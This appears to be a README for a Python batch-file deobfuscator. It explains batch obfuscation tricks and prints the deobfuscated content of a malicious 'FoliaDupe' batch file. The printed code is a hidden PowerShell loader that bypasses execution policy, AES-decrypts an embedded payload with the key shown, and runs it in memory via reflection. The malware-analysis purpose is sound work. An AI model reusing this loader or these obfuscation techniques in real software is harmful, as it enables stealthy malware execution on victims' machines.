## ABOUT
I wrote this script just to deobfuscate a single bat file (**fake FoliaDupe**) which structure looks something like this:
``` batch
%QFcihijRZS%@%QFcihijRZS%@%QFcihijRZS%s%QFcihijRZS%e%QFcihijRZS%t%QFcihijRZS%% "ykakdHlIvQkCTInBhwCMIRTdKlCZRfMaEyLbwjWxOqAqPAZYooSdOKrfPxYrFLoODIyVwKFxXFyPRbNKKajbMhLrEfMyKdpDBkmHCDbdjUFJMaNliOgbaMBUwERPyGlrOuOfoGHHzErpaCfbQYOvyMZniRKykLgbiMuRMgxaGXcVTKruWoyXppvBRYxVvJVlWOHOIMOjalmXiETXXQYwMHkqQqAljZgxCpzECcjKYNwECVRNFXycjYXOcPxPMbzBFpUqEPUufNVzKgnuYkgLaCLaRiYlfTywOvyLBYInCDxUDYEwZDoZvmXCcrYUoiNKPYiPhbrzbqJXEpWqdbKbcWBZVvgHAlzRolFconNyJpyDcAxmUgpLXkfrXHrmwkzoqpiRjrCpOLRmYxxUyrlRwmuDFMFgvYCXqHKlQdDadAwLRrRZKWnCyfrEwdMWmTvnJrwQkJESoKlwpgkMudVWkzZKNGolQdnKEGCYwBnARUMmuxNNuzbHxWDJRkCdSRBJVaqidLProVEOklQQqarQBfMfCqGKyJfATDQ=%QFcihijRZS%@%QFcihijRZS%e%QFcihijRZS%c%QFcihijRZS%h%QFcihijRZS%o%QFcihijRZS% %QFcihijRZS%o%QFcihijRZS%o%QFcihijRZS%f%QFcihijRZS%f%QFcihijRZS%""
%ykakdHlIvQkCTInBhwCMIRTdKlCZRfMaEyLbwjWxOqAqPAZYooSdOKrfPxYrFLoODIyVwKFxXFyPRbNKKajbMhLrEfMyKdpDBkmHCDbdjUFJMaNliOgbaMBUwERPyGlrOuOfoGHHzErpaCfbQYOvyMZniRKykLgbiMuRMgxaGXcVTKruWoyXppvBRYxVvJVlWOHOIMOjalmXiETXXQYwMHkqQqAljZgxCpzECcjKYNwECVRNFXycjYXOcPxPMbzBFpUqEPUufNVzKgnuYkgLaCLaRiYlfTywOvyLBYInCDxUDYEwZDoZvmXCcrYUoiNKPYiPhbrzbqJXEpWqdbKbcWBZVvgHAlzRolFconNyJpyDcAxmUgpLXkfrXHrmwkzoqpiRjrCpOLRmYxxUyrlRwmuDFMFgvYCXqHKlQdDadAwLRrRZKWnCyfrEwdMWmTvnJrwQkJESoKlwpgkMudVWkzZKNGolQdnKEGCYwBnARUMmuxNNuzbHxWDJRkCdSRBJVaqidLProVEOklQQqarQBfMfCqGKyJfATDQ%
```


This obfuscation uses "null string" (that's how I call undeclared variables), variable addition manipulations like this:

``` batch
set "GhrBLmrQ=="  `
set "aXlbMN%GhrBLmrQ%@echo."  
set "BxRRRldk%GhrBLmrQ% "  
set "aaAAssa%GhrBLmrQ%off"  
:: @echo off  
%aXlbMN%%%BxRRRldk%%aaAAssa%% 
```

... and string trimming (also string replacement):
```batch
set "obf_set=sabcdefghijklmnopet "
%obf_set:abcdefghijklmnop=%"abc=%null_string%temp_var"
:: abcdef... removed from the obf_set value to get "set="
```

... or extracting characters from strings:
```batch
set "obf_set=abcdefghijklmnopqrstuvwxyz"
%obf_set:~18,1%%obf_set:~4,1%%obf_set:~19,1%=value
:: we took 18 symbol, 4 symbol and 19 from obf_set to get "set"
```
Also, the script can work with local enviroment: `setlocal`
<br>

#### <u> !!! WARNING !!!</u>
**I am not very good at syntax of complex batch files and deobfuscated several files only! I don't guarantee that this script will work with absolutely all files obfuscated in a similar way, but you can try or ask me to implement more batch syntax.** 

## USAGE

`Deobfuscator(path_to_file.bat).parse_file()`


_Deobfuscator(self, filename: str, with_save: bool = True, save_sets: bool = False)_  
`filename` - path to your obfuscated batch file  
`with_save` - whether the script should write the result to a file. 
Result will be at the same folder named "patch_to_file.bat.deob"  
`save_sets` - whether the script should write `set "key=val"` to the deobfuscated file

## TODO
I don't want to work on this repo unnecessarily, so you can open an issue or write me via Telegram or Discord (@CrowTheBest) to ask a feature.

Here are that script can't work with now:<br>
- one-line expressions with "&"
- `setlocal Enable/DisableExtensions` because I don't know what it does
- some expressions with "~" (working on it)
- every single (or yours) system variables. Is it necessary? Couse I don't think so. You should add them yourself in the list
- something else? 

## FoliaDupe.bat
It's a FAKE DUPE. Malware? Maybe.  
File taken from the description of this video: https://youtu.be/PdRQ64SbE4I?si=mi3lWGb5IUO_Yx5t
  
Inside the deobfuscated file there is PowerShell code that DECODES and RUNS something I couldn't decode. I suggest you give it a try!

Deobfuscated file is:
```batch
@echo off
@echo off
@echo off
copy %systemdrive%\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "%~0.exe"
cls
cd "%~dp0"
"%~nx0.exe" -noprofile -windowstyle hidden -ep bypass -command function XLPlo($BhSTN){	$pDhjk=[System.Security.Cryptography.Aes]::Create();	$pDhjk.Mode=[System.Security.Cryptography.CipherMode]::CBC;	$pDhjk.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;	$pDhjk.Key=[System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('vFuSCe3fHoUWXzqHJ3Qxk3jpsLWQdA9WeUHOrG8RmnY=');	$pDhjk.IV=[System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('p1dba4oTFRK1RCpZchmyTQ==');	$qTxPe=$pDhjk.CreateDecryptor();	$return_var=$qTxPe.TransformFinalBlock($BhSTN, 0, $BhSTN.Length);	$qTxPe.Dispose();	$pDhjk.Dispose();	$return_var;}function XEmgW($BhSTN){	$XIIhe=New-Object System.IO.MemoryStream(,$BhSTN);	$mXnRW=New-Object System.IO.MemoryStream;	$irZUc=New-Object System.IO.Compression.GZipStream($XIIhe, [IO.Compression.CompressionMode]::Decompress);	$irZUc.CopyTo($mXnRW);	$irZUc.Dispose();	$XIIhe.Dispose();	$mXnRW.Dispose();	$mXnRW.ToArray();}function uaQYS($BhSTN,$yAhHl){	$nWSGQ=[System.Reflection.Assembly]::('daoL'[-1..-4] -join '')([byte[]]$BhSTN);	$mAXwY=$nWSGQ.EntryPoint;	$mAXwY.Invoke($null, $yAhHl);}$fpcde=[System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('%~f0').Split([Environment]::NewLine);foreach ($JaMAT in $fpcde) {	if ($JaMAT.StartsWith('SEROXEN'))	{		$sXWLj=$JaMAT.Substring(7);		break;	}}$wKljC=[string[]]$sXWLj.Split('\');$feudx=XEmgW (XLPlo ([Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($wKljC[0])));$IkrIa=XEmgW (XLPlo ([Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($wKljC[1])));uaQYS $IkrIa (,[string[]] , 'idTznCCsreqaEEjvuwzuTuitglIVMFHEuLsTnnuHsLwyMmxaqK', 'LkIzMJCsatThEdeYOSSAwnZMOfyqejPcYtnoxQiuObLPDohIJN'));uaQYS $feudx (,[string[]] , 'idTznCCsreqaEEjvuwzuTuitglIVMFHEuLsTnnuHsLwyMmxaqK', 'LkIzMJCsatThEdeYOSSAwnZMOfyqejPcYtnoxQiuObLPDohIJN'));
exit /b
SEROXEN...
```
You need to deobfuscate that batch file yourself, as the last line is encrypted code for PowerShell, which is decoded and executed on line 7. It is very large (10MB) to publish here. 
I don't know what this code does, so if you were able to decrypt it - message me on Discord or Telegram (@CrowTheBest)
